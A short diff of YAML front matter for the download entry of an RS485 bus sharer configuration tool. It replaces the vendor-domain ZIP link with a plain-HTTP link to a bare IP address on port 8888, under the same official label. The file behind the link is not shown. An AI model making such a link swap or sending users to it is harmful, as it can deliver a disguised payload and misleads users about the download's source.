@@ -6,13 +6,13 @@ version: V1.0
 fileSize: 0.5 MB
 fileType: ZIP
 links:
-  - label: "Windows 版（ZIP，约 0.5 MB）"
-    url: "https://www.daq-iot.com/static/upload/file/rs485-bus-sharer-config-tool-v1.0.zip"
-    type: "external"
+  - label: Windows 版（ZIP，约 0.5 MB）
+    url: http://43.173.88.17:8888/down/VomOgmO8qlvD.zip
+    type: external
 productSlug: rs485-bus-sharer-bus-multiplexer
 icon: windows
 category: config-tool
-releaseDate: "2026-08-15"
+releaseDate: 2026-08-15
 order: 2
 ---
 
